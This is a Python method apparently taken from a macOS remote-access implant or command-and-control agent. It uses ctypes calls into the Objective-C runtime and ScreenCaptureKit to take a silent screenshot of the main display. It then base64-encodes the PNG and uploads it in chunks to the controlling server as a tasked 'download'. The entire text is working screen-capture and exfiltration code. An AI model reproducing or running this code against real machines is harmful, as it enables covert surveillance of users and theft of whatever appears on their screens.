    def screenshot(self, task_id):
        from ctypes import _dlopen, CDLL, c_void_p, c_char_p, c_uint, c_size_t, c_buffer, c_ulonglong, c_bool, c_longlong, POINTER, c_int, CFUNCTYPE, Structure, c_ulong, c_char_p, byref, cast, sizeof, c_int32, pointer, string_at

        class Id(c_void_p):
            def __getattr__(self, name):
                name = name.replace("_", ":")
                return lambda *args: self.I(name, *args)
            
            def I(self, selector, *args): 
                clazz = _libObjC.object_getClass(self)
                sel = _libObjC.sel_registerName(selector.encode('utf-8'))
                method = _libObjC.class_getInstanceMethod(clazz, sel)

                class_name = _libObjC.class_getName(clazz)

                if not method:
                    raise Exception(f"Method {selector} not found in class {class_name.decode('utf-8')}")
                returnType, argTypes = _getReturnAndArgTypes(method)

                typed_objc_msgSend = _libObjC.objc_msgSend

                typed_objc_msgSend.restype = returnType
                typed_objc_msgSend.argtypes = argTypes

                return typed_objc_msgSend(self, sel, *args)

        id_subclasses = [
            "Ivar", "Method", "Property", "Protocol", "Class", "SEL", "IMP", "Block",
        ]

        for class_name in id_subclasses:
            globals()[class_name] = type(class_name, (Id,), {})

        def _load_lib(name):
            if not _dlopen(name):
                raise OSError('Cannot find library %s' % name)
                
            return CDLL(name)

        def _csignature(libfunc, restype, *argtypes, variadic=False):
            libfunc.restype = restype

            if argtypes:
                libfunc.argtypes = argtypes
            
            return libfunc

        def objcArgTypeToCType(argtype):
            _objcArgTypeToCType = {
                b"c": c_char_p,
                b"v": None,
                b"@": Id,
                b"#": Class,
                b":": SEL,
                b"Q": c_ulonglong,
                b"r*": c_char_p,
                b"B": c_bool,
                b"q": c_longlong,
                b"^@": POINTER(c_void_p),
                b"i": c_int,
                b"@?": Block
            }

            if argtype in _objcArgTypeToCType:
                return _objcArgTypeToCType[argtype]
            else:
                raise Exception(f"Unknown Objective-C argument type: {argtype.decode('utf-8')}")


        _libFoundation = _load_lib('/System/Library/Frameworks/Foundation.framework/Foundation')

        if _libFoundation:
            _csignature(_libFoundation.NSLog, None, c_void_p, variadic=True)

        _libObjC = _load_lib('/usr/lib/libobjc.dylib')

        if _libObjC:
            _csignature(_libObjC.class_getName, c_char_p, Class)
            _csignature(_libObjC.objc_getClass, Class, c_char_p)
            _csignature(_libObjC.sel_registerName, SEL, c_char_p)
            _csignature(_libObjC.class_getClassMethod, Method, Class, SEL)
            _csignature(_libObjC.class_getInstanceMethod, Method, Class, SEL)
            _csignature(_libObjC.method_getImplementation, IMP, Method)
            _csignature(_libObjC.method_getName, SEL, Method)
            _csignature(_libObjC.sel_getName, c_char_p, SEL)
            _csignature(_libObjC.method_getTypeEncoding, c_char_p, Method)
            _csignature(_libObjC.method_getNumberOfArguments, c_uint, Method)        
            _csignature(_libObjC.method_getArgumentType, None, Method, c_uint, c_char_p, c_size_t)
            _csignature(_libObjC.method_getReturnType, None, Method, c_char_p, c_size_t)
            _csignature(_libObjC.objc_msgSend, Id, Id, SEL, variadic=True)
            _csignature(_libObjC.object_getClassName, c_char_p, Id)
            _csignature(_libObjC.object_getClass, Class, Id)

        def _getReturnAndArgTypes(method):
            numArgs = _libObjC.method_getNumberOfArguments(method)
            argTypes = []

            for i in range(numArgs):
                argType = c_buffer(512)
                _libObjC.method_getArgumentType(method, i, argType, len(argType))
                argTypeCType = objcArgTypeToCType(argType.value)
                argTypes.append(argTypeCType)

            returnType = c_buffer(512)
            _libObjC.method_getReturnType(method, returnType, len(returnType))
            returnTypeCType = objcArgTypeToCType(returnType.value)

            return returnTypeCType, argTypes

        class NSObject:
            def __init__(self, className):
                clazz = _libObjC.objc_getClass(className.encode('utf-8'))

                if not clazz:
                    raise Exception("Cannot find class %s" % className)
                
                self._class = clazz
                self._className = className

            def ptr(self):
                return self._class

            def __getattr__(self, name):
                name = name.replace("_", ":")
                return lambda *args: self.C(name, *args)

            def C(self, selector, *args,):
                sel = _libObjC.sel_registerName(selector.encode('utf-8'))
                method = _libObjC.class_getClassMethod(self._class, sel)

                returnType, argTypes = _getReturnAndArgTypes(method)

                typed_objc_msgSend = _libObjC.objc_msgSend
                typed_objc_msgSend.restype = returnType
                typed_objc_msgSend.argtypes = argTypes

                return typed_objc_msgSend(self._class, sel, *args)
            
        class ObjCBlockDescriptor(Structure):
            _fields_=[
                ('reserved',c_ulong),
                ('size',c_ulong),
                ('signature', c_char_p)
            ]
            
            def __init__(self,block):
                self.size=sizeof(block)

        def ObjCBlock(invoke,restype,argtypes):
            BLOCK_FUNC = CFUNCTYPE(restype,c_void_p,*argtypes)
            class Block(Structure):
                _fields_=  [
                    ('isa',c_void_p),
                    ('flags',c_int32),
                    ('reserved',c_int32),
                    ('invoke',BLOCK_FUNC),
                    ('descriptor',POINTER(ObjCBlockDescriptor))
                ]   
                
                def __init__(self):
                    self.descriptor=pointer(ObjCBlockDescriptor(self))
                    self.isa=NSObject("NSBlock").ptr()
                    self.invoke=BLOCK_FUNC(invoke)

            return byref(Block())

        _load_lib("/System/Library/Frameworks/ScreenCaptureKit.framework/ScreenCaptureKit")
        _libCoreGraphics = _load_lib("/System/Library/Frameworks/CoreGraphics.framework/CoreGraphics")

        if _libCoreGraphics:
            _csignature(_libCoreGraphics.CFDataCreateMutable, c_void_p, c_void_p, c_size_t)
            _csignature(_libCoreGraphics.CFDataGetLength, c_size_t, c_void_p)
            _csignature(_libCoreGraphics.CFDataGetBytePtr, c_void_p, c_void_p)
            _csignature(_libCoreGraphics.CGImageRetain, c_void_p, c_void_p)
            _csignature(_libCoreGraphics.CFRelease, None, c_void_p)

        _libQuartz = _load_lib("/System/Library/Frameworks/Quartz.framework/Quartz")

        if _libQuartz:
            _csignature(_libQuartz.CGImageDestinationCreateWithData, c_void_p, c_void_p, c_void_p, c_ulong, c_void_p)
            _csignature(_libQuartz.CGImageDestinationAddImage, None, c_void_p, Id, c_void_p)
            _csignature(_libQuartz.CGImageDestinationFinalize, c_bool, c_void_p)

        finished = False
        image = None

        def captureImageWithFilterConfigurationCompletionHandlerBlock(self, cgImage, error):
            if error:
                raise Exception(f"Error capturing image: {error.description().UTF8String()}")

            _libCoreGraphics.CGImageRetain(cgImage)

            nonlocal finished, image
            finished = True
            image = cgImage


        blk2 = ObjCBlock(captureImageWithFilterConfigurationCompletionHandlerBlock, None, [Id, Id])

        def getShareableContentWithCompletionHandlerBlock(self, shareableContent, error):
            if error:
                raise Exception(error.description().UTF8String())
            

            display = shareableContent.displays().firstObject()
            filter = NSObject("SCContentFilter").alloc().initWithDisplay_excludingWindows_(display, NSObject("NSArray").array())
            configuration = NSObject("SCStreamConfiguration").alloc().init()

            configuration.setCapturesAudio_(False)
            configuration.setExcludesCurrentProcessAudio_(True)
            configuration.setPreservesAspectRatio_(True)
            configuration.setShowsCursor_(True)

            SCCaptureResolutionBest = 2
            configuration.setCaptureResolution_(SCCaptureResolutionBest)

            NSObject("SCScreenshotManager").captureImageWithFilter_configuration_completionHandler_(
                filter, configuration, blk2
            )



        blk = ObjCBlock(getShareableContentWithCompletionHandlerBlock, None, [Id, Id])
        NSObject("SCShareableContent").getShareableContentWithCompletionHandler_(blk)

        while True:
            if finished:
                break

        if not image:
            raise Exception("Failed to capture screenshot.")



        sh_data = _libCoreGraphics.CFDataCreateMutable(None, 0)
        pngUTType = NSObject("NSString").stringWithUTF8String_(b"public.png")

        dest = _libQuartz.CGImageDestinationCreateWithData(sh_data, pngUTType, 1, None)

        file_size = 0
        if(dest is None):
            raise Exception("Failed to create image destination.")
        

        _libQuartz.CGImageDestinationAddImage (dest, image, 0)

        if not _libQuartz.CGImageDestinationFinalize(dest):
            raise Exception("Failed to finalize image destination.")

        file_size = _libCoreGraphics.CFDataGetLength(sh_data)

        data_ptr = _libCoreGraphics.CFDataGetBytePtr(sh_data)
        screenshot_data = string_at(data_ptr, file_size)

        _libCoreGraphics.CFRelease(sh_data)
        _libCoreGraphics.CFRelease(image)

        if(file_size) > 0:
            total_chunks = int(file_size / CHUNK_SIZE) + (file_size % CHUNK_SIZE > 0)

            data = {
                "action": "post_response",
                "responses": [
                    { "download": { "total_chunks": total_chunks, "is_screenshot": True }, "task_id": task_id }
                ]
            }
            register_file = self.postMessageAndRetrieveResponse(data)

            if register_file["responses"][0]["status"] != "success":
                raise Exception("Failed to register screenshot file.")

            for i in range(0,total_chunks):
                if [task for task in self.taskings if task["task_id"] == task_id][0]["stopped"]:
                    return "Job stopped."

                if i == total_chunks:
                    content = screenshot_data[i*CHUNK_SIZE:]
                else:
                    content = screenshot_data[i*CHUNK_SIZE:(i+1)*CHUNK_SIZE]

                data = {
                    "action": "post_response",
                    "responses": [
                        { 
                            "download": {
                                "chunk_num": i+1,
                                "chunk_data": base64.b64encode(content).decode(),
                                "file_id": register_file["responses"][0]["file_id"],
                            },
                            "task_id": task_id,
                            "status": f"Uploading chunk {i+1} of {total_chunks}"
                        }
                    ]
                }

                response = self.postMessageAndRetrieveResponse(data)

        return json.dumps({
            "user_output": json.dumps({"file_id": register_file["responses"][0]["file_id"]}),
            "completed": True,
        })